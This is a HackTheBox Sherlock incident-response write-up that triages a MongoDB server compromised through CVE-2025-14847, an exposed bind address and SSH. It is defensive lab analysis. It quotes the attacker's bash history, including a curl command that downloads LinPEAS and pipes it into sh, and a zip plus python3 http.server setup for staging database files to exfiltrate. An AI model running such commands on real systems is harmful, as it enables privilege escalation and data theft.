---
title: 'HTB Sherlock: MangoBleed'
description: 'Rapid triage of a compromised MongoDB server: an unauthenticated CVE exploit over an exposed bind address, SSH access, and a staged exfiltration attempt.'
pubDate: 2025-12-29
platform: 'HackTheBox'
category: 'Sherlock'
os: 'Linux'
difficulty: 'Very Easy'
retired: true
tags: ['htb', 'sherlock', 'dfir', 'mongodb', 'triage', 'log-analysis']
---

## Scenario

A secondary MongoDB server, `mongodbsync`, is suspected to be compromised. The admin
mentions a vulnerability they call "MongoBleed" and has provided root-level access. A UAC
triage acquisition is already collected — the job is to work through the artifacts and
determine whether the host was compromised, map the attacker activity, and give an initial
assessment.

## Task 1 — The CVE

The vulnerability referenced in the scenario is **CVE-2025-14847**.

## Task 2 — MongoDB version (the metapackage trap)

```bash
grep "mongodb" dpkg_-l.txt
```

```
ii  mongodb-org-server   8.0.16   amd64   MongoDB database server
ii  mongodb-org-mongos   8.0.16   amd64   MongoDB sharded cluster query router
ii  mongodb-org-shell    8.0.16   amd64   MongoDB shell client
ii  mongodb-org-tools    8.0.16   amd64   MongoDB tools
```

The answer is **8.0.16**, but which package you trust matters. `mongodb-org` and
`mongodb-org-database` are metapackages — they aggregate dependencies and run no code, and
their versions can drift (here `mongodb-org-database` showed 8.0.17 while the server was
8.0.16). For a server-side CVE, the version is the one the daemon actually runs, so trust
`mongodb-org-server`. Corroborate with the build-info banner in `mongod.log`
(`"version":"8.0.16"`).

## Task 3 — Attacker IP

The exploit shows up as a burst of connections in a short window:

```bash
cat mongod.log | grep "accepted"
```

```json
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I","c":"NETWORK","id":22943,"ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","connectionId":1,"connectionCount":1}}
```

The source is **`65.0.76.43`**.

## Task 4 — When exploitation began

For an **unauthenticated** exploit there's no login or query event preceding it — the
crafted connection *is* the first malicious action. So the earliest `Connection accepted`
(log id 22943) from the attacker IP is the start:

```
2025-12-29 05:25:52
```

Verify nothing earlier exists: checking the head of `mongod.log` shows no client
connections before the attacker's burst. (Context, not the event itself: `dpkg -V` flagged
`/etc/mongod.conf` as modified, and the bind address had been changed from `127.0.0.1` to
`0.0.0.0` — that exposure is what made the unauthenticated hit possible.)

## Task 5 — Number of malicious connections

```bash
cat mongod.log | grep "65.0.76.43" | wc -l
```

```
75260
```

## Task 6 — Interactive access (the two-"Accepted" trap)

```bash
cat auth.log | grep "65.0.76.43" | grep "Accepted"
```

Two accepted logins show up, but only the second is a hands-on session. Tell them apart by
session lifecycle, not by the accepted line alone:

- **05:39:24** — accepted, session opened, closed in ~0.6s. The same PID had two
  `pam: authentication failure` lines before it. This is a brute-force tool validating
  credentials.
- **05:40:03** — accepted, session opened, then ~8 minutes later `received disconnect …
  disconnected by user`. This is the real interactive session.

The answer is the second login, **2025-12-29 05:40:03**. The rule of thumb: an automated
login dies in under a second; a hands-on session lingers and ends with an active user
disconnect. Check the `pam_unix(sshd:session)` open/close pairs, not just `Accepted`.

## Task 7 — In-memory privilege-escalation command

`.bash_history` for `mongoadmin` shows an attempt to pipe LinPEAS straight into a shell
(never touching disk):

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Task 8 — Exfiltration target directory

Continuing through the same history, the attacker installs `zip`, moves into the MongoDB
data directory, and starts a Python web server — classic stage-and-serve exfiltration:

```bash
cd /var/lib/mongodb/
which zip
apt install zip
python3 -m http.server 6969
```

The targeted directory is **`/var/lib/mongodb/`**, the MongoDB data directory.

## Assessment

- **Initial access:** unauthenticated exploitation of CVE-2025-14847 against
  `mongodb-org-server` 8.0.16, reachable because the bind address was changed to `0.0.0.0`.
- **Foothold:** SSH as `mongoadmin` from `65.0.76.43` after a brief brute force.
- **Privilege escalation:** in-memory LinPEAS run.
- **Staged exfiltration:** database files in `/var/lib/mongodb/` zipped and served over an
  ad-hoc Python HTTP server on port 6969.

**Recommended next steps:** isolate the host, restore `bind_ip` to localhost, patch MongoDB,
rotate the `mongoadmin` credentials and keys, and hunt for `65.0.76.43` and the port-6969
server elsewhere in the environment.
